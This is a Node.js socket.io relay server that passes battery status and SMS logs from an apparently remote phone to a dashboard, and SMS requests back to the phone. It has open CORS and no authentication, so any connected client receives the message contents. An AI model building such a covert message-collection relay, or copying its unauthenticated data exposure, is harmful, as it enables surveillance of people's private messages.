const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" },
    pingInterval: 10000, // Check every 10 seconds
    pingTimeout: 5000    // Faster timeout detection
});

app.use(express.static(path.join(__dirname, 'public')));

io.on('connection', (socket) => {
    socket.on('battery-status', (data) => {
        socket.broadcast.emit('ui-battery', data);
    });

    socket.on('get-sms-request', () => {
        socket.broadcast.emit('get-sms-request');
    });

    socket.on('sms-data-log', (data) => {
        socket.broadcast.emit('ui-sms-display', data);
    });

    socket.on('disconnect', () => {
        socket.broadcast.emit('device-status', { online: false });
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`Fast Server on port ${PORT}`));
